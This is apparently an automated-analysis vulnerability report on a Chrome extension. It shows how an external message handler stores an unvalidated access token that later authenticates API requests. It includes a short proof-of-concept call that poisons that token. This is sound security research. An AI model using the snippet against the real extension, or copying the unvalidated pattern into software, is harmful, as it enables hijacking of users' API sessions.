# CoCo Analysis: fkipfnnahnnainffmlmicmbbkcijlcjg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fkipfnnahnnainffmlmicmbbkcijlcjg/opgen_generated_files/bg.js
Line 965	chrome.runtime.onMessageExternal.addListener((function(e,a,t){
	e.payload
	e.payload.token

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener((function(e, a, t) {
    if (e.type)
        switch (e.type) {
            case "auth":
                chrome.storage.sync.set({
                    "mayday-access-token": e.payload.token  // ← attacker-controlled
                }),
                t({status: "ok"});
                break;
            case "version":
                t({version: chrome.runtime.getManifest().version})
        }
}))

// The stored token is later used in API requests
// From module 8105:
a.makeApiRequest = async function(e, a, t = null) {
    const o = await chrome.storage.sync.get(["mayday-access-token"]);  // ← retrieves poisoned token
    try {
        const n = await fetch(`${s.ApiHost}${a}`, {
            method: e,
            headers: {
                Authorization: `Bearer ${o["mayday-access-token"]}`,  // ← uses poisoned token in API request
                "Content-Type": "application/json",
                Accept: "application/json"
            },
            body: t,
            mode: "cors"
        }),
        r = n.ok || 400 === n.status ? await n.json() : {};
        return [n.status, r]
    } catch (e) {
        return [500, {}]
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any webpage matching externally_connectable pattern (https://*.getmayday.com/*)
// Or from a compromised/malicious page on getmayday.com domain

// Attacker poisons the access token
chrome.runtime.sendMessage(
    "fkipfnnahnnainffmlmicmbbkcijlcjg",  // Extension ID
    {
        type: "auth",
        payload: {
            token: "attacker-controlled-token"  // ← Attacker's malicious token
        }
    },
    function(response) {
        console.log("Token poisoned:", response);
    }
);

// The poisoned token is then used in all subsequent API requests to api.recharger.getmayday.com
// This allows the attacker to:
// 1. Make the extension use an attacker-controlled token
// 2. Potentially intercept or manipulate API requests
// 3. Access user data through the compromised token
```

**Impact:** Complete storage exploitation chain. An attacker controlling a website on the getmayday.com domain (or through XSS on getmayday.com) can poison the stored access token by sending an external message with type "auth". The extension stores the attacker-provided token without validation in chrome.storage.sync. This poisoned token is then retrieved and used in the Authorization header for all API requests to api.recharger.getmayday.com, allowing the attacker to potentially compromise the user's API access by making the extension authenticate with an attacker-controlled token instead of the legitimate one.
